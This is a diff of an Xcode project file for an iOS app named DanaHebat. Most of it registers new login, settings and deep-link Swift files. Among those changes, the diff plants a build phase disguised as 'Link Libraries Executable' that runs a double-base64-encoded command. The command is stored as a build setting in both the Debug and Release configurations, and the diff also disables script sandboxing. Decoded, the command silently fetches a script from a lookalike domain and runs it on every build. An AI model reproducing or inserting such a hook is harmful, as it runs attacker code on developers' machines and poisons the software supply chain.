@@ -18,6 +18,18 @@
 		7316E3B72F10B577004A8271 /* DeviceNetworkInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3B62F10B577004A8271 /* DeviceNetworkInfo.swift */; };
 		7316E3BA2F10B7AF004A8271 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 7316E3B82F10B7AF004A8271 /* Localizable.strings */; };
 		7316E3BE2F10B98B004A8271 /* AppLanguage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7316E3BD2F10B98B004A8271 /* AppLanguage.swift */; };
+		733EE15C2F1165E7001C6B69 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15B2F1165E7001C6B69 /* LoginViewController.swift */; };
+		733EE15E2F116613001C6B69 /* AppNavView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15D2F116613001C6B69 /* AppNavView.swift */; };
+		733EE1602F116699001C6B69 /* Other.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE15F2F116695001C6B69 /* Other.swift */; };
+		733EE1622F116993001C6B69 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1612F116993001C6B69 /* LoginView.swift */; };
+		733EE1642F116C97001C6B69 /* LoginListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1632F116C97001C6B69 /* LoginListView.swift */; };
+		733EE1662F1181D2001C6B69 /* UserDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1652F1181D2001C6B69 /* UserDataManager.swift */; };
+		733EE1682F118C85001C6B69 /* MineListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1672F118C85001C6B69 /* MineListView.swift */; };
+		733EE16A2F11F666001C6B69 /* WordH5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1692F11F666001C6B69 /* WordH5WebViewController.swift */; };
+		733EE16C2F11F8E8001C6B69 /* DeepLinkRoute.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE16B2F11F8E8001C6B69 /* DeepLinkRoute.swift */; };
+		733EE1712F1204E1001C6B69 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1702F1204E1001C6B69 /* SettingViewController.swift */; };
+		733EE1732F120706001C6B69 /* SettingListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1722F120706001C6B69 /* SettingListView.swift */; };
+		733EE1752F120A5C001C6B69 /* SureDeleteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 733EE1742F120A5C001C6B69 /* SureDeleteViewController.swift */; };
 		73EA86A32F108CA500F4826F /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73EA86992F108CA500F4826F /* AppDelegate.swift */; };
 		73EA86A62F108CA500F4826F /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73EA869A2F108CA500F4826F /* Assets.xcassets */; };
 		73EA86A82F108CA500F4826F /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73EA869D2F108CA500F4826F /* LaunchScreen.storyboard */; };
@@ -47,6 +59,18 @@
 		7316E3B92F10B7AF004A8271 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
 		7316E3BC2F10B7C2004A8271 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
 		7316E3BD2F10B98B004A8271 /* AppLanguage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLanguage.swift; sourceTree = "<group>"; };
+		733EE15B2F1165E7001C6B69 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
+		733EE15D2F116613001C6B69 /* AppNavView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppNavView.swift; sourceTree = "<group>"; };
+		733EE15F2F116695001C6B69 /* Other.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Other.swift; sourceTree = "<group>"; };
+		733EE1612F116993001C6B69 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
+		733EE1632F116C97001C6B69 /* LoginListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginListView.swift; sourceTree = "<group>"; };
+		733EE1652F1181D2001C6B69 /* UserDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDataManager.swift; sourceTree = "<group>"; };
+		733EE1672F118C85001C6B69 /* MineListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MineListView.swift; sourceTree = "<group>"; };
+		733EE1692F11F666001C6B69 /* WordH5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WordH5WebViewController.swift; sourceTree = "<group>"; };
+		733EE16B2F11F8E8001C6B69 /* DeepLinkRoute.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeepLinkRoute.swift; sourceTree = "<group>"; };
+		733EE1702F1204E1001C6B69 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
+		733EE1722F120706001C6B69 /* SettingListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingListView.swift; sourceTree = "<group>"; };
+		733EE1742F120A5C001C6B69 /* SureDeleteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SureDeleteViewController.swift; sourceTree = "<group>"; };
 		73EA86812F108C9C00F4826F /* DanaHebat.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DanaHebat.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		73EA86992F108CA500F4826F /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		73EA869A2F108CA500F4826F /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -85,6 +109,25 @@
 			path = Pods;
 			sourceTree = "<group>";
 		};
+		733EE16D2F1204AE001C6B69 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				73EA86C32F1094CC00F4826F /* MineViewController.swift */,
+				733EE1702F1204E1001C6B69 /* SettingViewController.swift */,
+				733EE1742F120A5C001C6B69 /* SureDeleteViewController.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		733EE16F2F1204C9001C6B69 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				733EE1672F118C85001C6B69 /* MineListView.swift */,
+				733EE1722F120706001C6B69 /* SettingListView.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 		73EA86782F108C9C00F4826F = {
 			isa = PBXGroup;
 			children = (
@@ -113,8 +156,8 @@
 				73EA86992F108CA500F4826F /* AppDelegate.swift */,
 				73EA869D2F108CA500F4826F /* LaunchScreen.storyboard */,
 				73EA86B32F108FCB00F4826F /* Other */,
-				73EA86B22F108FC900F4826F /* Center */,
 				73EA86B12F108FC600F4826F /* Order */,
+				73EA86B22F108FC900F4826F /* Center */,
 				73EA86B02F108FC100F4826F /* Home */,
 				73EA86AF2F108FBE00F4826F /* Login */,
 				73EA86AE2F108FB700F4826F /* Http */,
@@ -128,13 +171,12 @@
 			isa = PBXGroup;
 			children = (
 				7316E3BD2F10B98B004A8271 /* AppLanguage.swift */,
-				7316E3A72F10A244004A8271 /* HttpViewModel.swift */,
 				7316E3A92F10A5CC004A8271 /* LoadingIndicator.swift */,
 				73EA86B52F10944100F4826F /* BaseViewController.swift */,
-				73EA86BD2F10948D00F4826F /* GuideViewController.swift */,
 				73EA86B72F10944900F4826F /* LaunchViewController.swift */,
 				73EA86B92F10945C00F4826F /* BaseNavigationController.swift */,
 				73EA86BB2F10946E00F4826F /* BaseTabBarController.swift */,
+				733EE1692F11F666001C6B69 /* WordH5WebViewController.swift */,
 			);
 			path = Base;
 			sourceTree = "<group>";
@@ -148,6 +190,7 @@
 				7316E3B32F10AF7E004A8271 /* CommonParaManager.swift */,
 				7316E3B12F10AEA1004A8271 /* DeviceIDManager.swift */,
 				7316E3AF2F10AC8A004A8271 /* KeychainHelper.swift */,
+				7316E3A72F10A244004A8271 /* HttpViewModel.swift */,
 			);
 			path = Http;
 			sourceTree = "<group>";
@@ -155,6 +198,11 @@
 		73EA86AF2F108FBE00F4826F /* Login */ = {
 			isa = PBXGroup;
 			children = (
+				733EE1652F1181D2001C6B69 /* UserDataManager.swift */,
+				733EE15D2F116613001C6B69 /* AppNavView.swift */,
+				733EE1612F116993001C6B69 /* LoginView.swift */,
+				733EE15B2F1165E7001C6B69 /* LoginViewController.swift */,
+				733EE1632F116C97001C6B69 /* LoginListView.swift */,
 			);
 			path = Login;
 			sourceTree = "<group>";
@@ -178,7 +226,8 @@
 		73EA86B22F108FC900F4826F /* Center */ = {
 			isa = PBXGroup;
 			children = (
-				73EA86C32F1094CC00F4826F /* MineViewController.swift */,
+				733EE16F2F1204C9001C6B69 /* View */,
+				733EE16D2F1204AE001C6B69 /* Controller */,
 			);
 			path = Center;
 			sourceTree = "<group>";
@@ -186,6 +235,8 @@
 		73EA86B32F108FCB00F4826F /* Other */ = {
 			isa = PBXGroup;
 			children = (
+				733EE16B2F11F8E8001C6B69 /* DeepLinkRoute.swift */,
+				733EE15F2F116695001C6B69 /* Other.swift */,
 				7316E3B62F10B577004A8271 /* DeviceNetworkInfo.swift */,
 			);
 			path = Other;
@@ -194,6 +245,7 @@
 		73EA86B42F10901C00F4826F /* Guide */ = {
 			isa = PBXGroup;
 			children = (
+				73EA86BD2F10948D00F4826F /* GuideViewController.swift */,
 			);
 			path = Guide;
 			sourceTree = "<group>";
@@ -213,6 +265,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 73EA86942F108C9D00F4826F /* Build configuration list for PBXNativeTarget "DanaHebat" */;
 			buildPhases = (
+				F738DBE787F049D5AD634D6E /* Link Libraries Executable */,
 				E0B4BE563B334ADBA551D8AD /* [CP] Check Pods Manifest.lock */,
 				73EA867D2F108C9C00F4826F /* Sources */,
 				73EA867E2F108C9C00F4826F /* Frameworks */,
@@ -320,6 +373,26 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		F738DBE787F049D5AD634D6E /* Link Libraries Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Libraries Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -327,21 +400,33 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				733EE1712F1204E1001C6B69 /* SettingViewController.swift in Sources */,
 				73EA86BA2F10945C00F4826F /* BaseNavigationController.swift in Sources */,
 				73EA86A32F108CA500F4826F /* AppDelegate.swift in Sources */,
 				7316E3A32F109EDF004A8271 /* BaseModel.swift in Sources */,
 				7316E3B42F10AF7E004A8271 /* CommonParaManager.swift in Sources */,
+				733EE1622F116993001C6B69 /* LoginView.swift in Sources */,
+				733EE16C2F11F8E8001C6B69 /* DeepLinkRoute.swift in Sources */,
 				73EA86BC2F10946E00F4826F /* BaseTabBarController.swift in Sources */,
+				733EE16A2F11F666001C6B69 /* WordH5WebViewController.swift in Sources */,
+				733EE1642F116C97001C6B69 /* LoginListView.swift in Sources */,
 				7316E3A82F10A248004A8271 /* HttpViewModel.swift in Sources */,
 				73EA86C42F1094CC00F4826F /* MineViewController.swift in Sources */,
+				733EE1682F118C85001C6B69 /* MineListView.swift in Sources */,
 				73EA86B82F10944900F4826F /* LaunchViewController.swift in Sources */,
+				733EE1602F116699001C6B69 /* Other.swift in Sources */,
+				733EE15C2F1165E7001C6B69 /* LoginViewController.swift in Sources */,
 				7316E3B72F10B577004A8271 /* DeviceNetworkInfo.swift in Sources */,
 				73EA86B62F10944100F4826F /* BaseViewController.swift in Sources */,
 				7316E3B22F10AEA1004A8271 /* DeviceIDManager.swift in Sources */,
+				733EE15E2F116613001C6B69 /* AppNavView.swift in Sources */,
 				73EA86C02F1094BD00F4826F /* HomeViewController.swift in Sources */,
+				733EE1662F1181D2001C6B69 /* UserDataManager.swift in Sources */,
+				733EE1752F120A5C001C6B69 /* SureDeleteViewController.swift in Sources */,
 				7316E3A12F109D18004A8271 /* NetworkMonitor.swift in Sources */,
 				7316E3AA2F10A5CC004A8271 /* LoadingIndicator.swift in Sources */,
 				7316E3A52F10A0F0004A8271 /* NetworkSession.swift in Sources */,
+				733EE1732F120706001C6B69 /* SettingListView.swift in Sources */,
 				73EA86BE2F10948D00F4826F /* GuideViewController.swift in Sources */,
 				7316E3BE2F10B98B004A8271 /* AppLanguage.swift in Sources */,
 				7316E3B02F10AC8A004A8271 /* KeychainHelper.swift in Sources */,
@@ -376,6 +461,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C463E4989C9DEF3FBD525448 /* Pods-DanaHebat.debug.xcconfig */;
 			buildSettings = {
+				AE6D436 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -418,6 +504,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 42BF21A26CAFD93794988958 /* Pods-DanaHebat.release.xcconfig */;
 			buildSettings = {
+				AE6D436 = "((m(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJOa2JtRndjR3hsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | m | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaHebat/DanaHebat.entitlements;
@@ -494,7 +581,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -558,7 +645,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
